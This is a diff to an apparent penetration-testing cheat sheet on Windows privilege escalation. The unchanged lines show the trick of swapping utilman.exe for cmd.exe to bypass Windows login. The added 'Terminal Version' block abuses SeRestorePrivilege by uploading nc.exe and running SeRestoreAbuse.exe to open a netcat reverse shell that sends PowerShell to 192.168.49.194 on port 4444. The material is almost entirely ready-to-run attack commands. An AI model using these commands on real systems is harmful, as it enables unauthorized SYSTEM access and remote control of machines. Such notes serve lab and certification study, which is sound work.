@@ -288,6 +288,14 @@ mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 Kali: rdesktop victom_ip
 Kali: win+U to skip credential input
 ```
+Terminal Version:
+```
+.\EnableSeRestorePrivilege.ps1 (Enable SeRestore)
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
+cmd.exe /c sc qc seclogon
+upload nc.exe
+.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 4444 -e powershell.exe"
+```
 ##### PowerUp.ps1
 ```
 Service Enumeration:
